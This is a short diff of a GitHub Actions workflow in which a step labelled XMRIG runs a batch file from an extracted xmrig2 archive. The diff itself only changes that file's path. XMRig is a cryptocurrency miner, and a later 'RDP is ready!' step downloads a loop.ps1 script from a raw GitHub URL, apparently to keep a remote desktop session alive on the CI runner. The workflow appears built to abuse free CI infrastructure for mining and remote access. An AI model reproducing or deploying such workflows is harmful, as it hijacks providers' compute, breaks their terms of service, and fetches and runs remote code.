@@ -15,7 +15,7 @@ jobs:
     - name: Extracting Xmrig2 Files.
       run: Expand-Archive xmrig2.zip && cd xmrig2
     - name: XMRIG
-      run: cmd /c jai.bat
+      run: cmd /c D:\a\cpu\cpu\xmrig2\jai.bat
     - name: RDP is ready!
       run: | 
         Invoke-WebRequest https://raw.githubusercontent.com/romain09/AWS-RDP/main/loop.ps1 -OutFile loop.ps1
